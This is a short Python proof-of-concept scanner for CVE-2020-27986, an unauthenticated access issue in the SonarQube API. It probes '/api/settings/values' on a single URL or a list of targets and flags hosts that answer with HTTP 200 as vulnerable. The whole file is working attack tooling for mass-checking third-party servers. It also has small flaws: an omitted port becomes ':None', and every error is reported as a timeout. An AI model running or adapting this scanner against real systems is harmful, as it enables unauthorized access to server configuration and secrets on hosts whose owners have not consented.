#coding:utf-8
import requests
import argparse
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

def vul(url):
    try:
        payload = "api/settings/values"
        url0 = url + payload
        headers = {'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:55.0) Gecko/20100101 Firefox/55.0"}
        resp = requests.get(url=url0,headers=headers,timeout=5,verify=False)
        if resp.status_code == 200:
            print("[+] "+url+"  ---vul!")
        else:
            print("[-] "+url+"  ---No vul!")
    except Exception as e:
        print("访问超时")

if __name__ == '__main__':
    print('''
 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗  ██████╗       ██████╗ ███████╗ █████╗  █████╗  ██████╗ 
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██╔═████╗      ╚════██╗╚════██║██╔══██╗██╔══██╗██╔════╝ 
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝██║██╔██║█████╗ █████╔╝    ██╔╝╚██████║╚█████╔╝███████╗ 
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ████╔╝██║╚════╝██╔═══╝    ██╔╝  ╚═══██║██╔══██╗██╔═══██╗
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗╚██████╔╝      ███████╗   ██║   █████╔╝╚█████╔╝╚██████╔╝
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝ ╚═════╝       ╚══════╝   ╚═╝   ╚════╝  ╚════╝  ╚═════╝ 
                                                                                                    BY luckyZ                      
    ''')
    parser = argparse.ArgumentParser(description='CVE-2020-27986_SonarQube_api_未授权访问')
    parser.add_argument('-u',type=str,help='url')
    parser.add_argument('-f',type=str,help='file')
    args = parser.parse_args()
    if args.u:
        url = args.u
        _url = urlparse(url)
        url = _url.scheme + "://" + _url.hostname + ":" + str(_url.port) + "/"
        vul(url)
    if args.f:
        with open(args.f,"r") as f:
            for url in f.readlines():
                url = url.strip("\n")
                _url = urlparse(url)
                url = _url.scheme + "://" + _url.hostname + ":" + str(_url.port) + "/"
                vul(url)


